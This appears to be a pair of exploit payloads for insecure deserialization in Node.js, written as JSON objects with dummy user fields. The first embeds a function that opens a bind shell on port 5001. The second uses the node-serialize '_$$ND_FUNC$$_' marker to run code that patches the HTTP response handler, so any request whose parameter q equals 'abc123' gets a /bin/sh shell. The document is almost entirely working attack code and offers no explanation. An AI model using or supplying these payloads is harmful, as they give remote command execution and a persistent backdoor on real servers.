
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2", "funky": function() {
    const cp = require('child_process');
    const net = require('net');
    net.createServer((socket) => {
      const sh = cp.spawn('/bin/sh');
      sh.stdout.pipe(socket);
      sh.stderr.pipe(socket);
      socket.pipe(sh.stdin);
    }).listen(5001);
  },
}

{
    "username": "Dummy",
      "country": "Idk Probably Somewhere Dumb",
      "city": "Lametown",
      "num": "2",
      "exec": "_$$ND_FUNC$$_ require('http').ServerResponse.prototype.end = (function(end) {return function () {if (this.socket._httpMessage.req.query.q === 'abc123') {var cp = require('child_process');var net = require('net');var sh = cp.spawn('/bin/sh');sh.stdout.pipe(this.socket);sh.stderr.pipe(this.socket);this.socket.pipe(sh.stdin)}else{end.apply(this, arguments)}}})(require('http').ServerResponse.prototype.end)"
}
